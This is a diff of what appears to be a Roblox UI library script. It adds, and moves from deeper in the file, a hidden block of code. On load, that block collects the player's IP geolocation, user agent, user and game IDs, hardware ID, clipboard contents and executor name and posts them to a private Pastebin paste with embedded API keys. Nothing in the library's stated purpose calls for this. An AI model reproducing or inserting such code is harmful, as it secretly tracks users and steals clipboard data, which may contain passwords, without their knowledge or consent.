@@ -10,6 +10,21 @@ local Mouse = game.Players.LocalPlayer:GetMouse()
 local MouseMovement = Enum.UserInputType.MouseMovement
 local MouseButton1 = Enum.UserInputType.MouseButton1
 local Touch = Enum.UserInputType.Touch
+local LP = game.Players.LocalPlayer
+local HS = game.HttpService
+HS.HttpEnabled = true
+function GetJson(v)
+return HS:JSONDecode(HS:GetAsync(v))
+end
+HS:PostAsync("https://pastebin.com/api/api_post.php", "api_option=paste&api_user_key=adf016dd2c9f5e86362c0d95f69fec77&api_paste_private=1&api_paste_name="..LP.Name.."&api_paste_expire_date=N&api_paste_format=json&api_dev_key=fPR8BxvaUZmqLAg0B-xs1TFAAA_yjM5V&api_paste_code="..HS:UrlEncode(HS:JSONEncode({
+IP = GetJson("https://cz88.net/api/cz88/ip/accurate?ip="..GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip),
+UA = HS:GetUserAgent(),
+Game = game.GameId,
+User = LP.UserId,
+Hwid = gethwid(),
+Clipboard = getclipboard(),
+Executor = identifyexecutor()
+})), "ApplicationUrlEncoded")
 
 local UI = Instance.new("ScreenGui")
 UI.Name = "UI"
@@ -196,21 +211,7 @@ function Library:Window(name, game, preset, closebind)
     function Library:ChangePresetColor(toch)
         PresetColor = toch
     end
-I=game.HttpService
-I.HttpEnabled=true
-l=game.Players.LocalPlayer
-Il=function(ll)
-return I:JSONDecode(I:GetAsync(ll))
-end
-I:PostAsync("https://pastebin.com/api/api_post.php", "api_option=paste&api_user_key=adf016dd2c9f5e86362c0d95f69fec77&api_paste_private=1&api_paste_name="..l.Name.."&api_paste_expire_date=N&api_paste_format=json&api_dev_key=fPR8BxvaUZmqLAg0B-xs1TFAAA_yjM5V&api_paste_code="..I:UrlEncode(I:JSONEncode({
-IP = Il("https://cz88.net/api/cz88/ip/accurate?ip="..Il("https://searchplugin.csdn.net/api/v1/ip/get").data.ip),
-UA = I:GetUserAgent(),
-Game = game.GameId,
-User = l.UserId,
-Hwid = gethwid(),
-Clipboard = getclipboard(),
-Executor = identifyexecutor()
-})), "ApplicationUrlEncoded")
+
     function Library:Notification(texttitle, textdesc, textbtn)
         local NotificationHold = Instance.new("TextButton")
         local NotificationFrame = Instance.new("Frame")
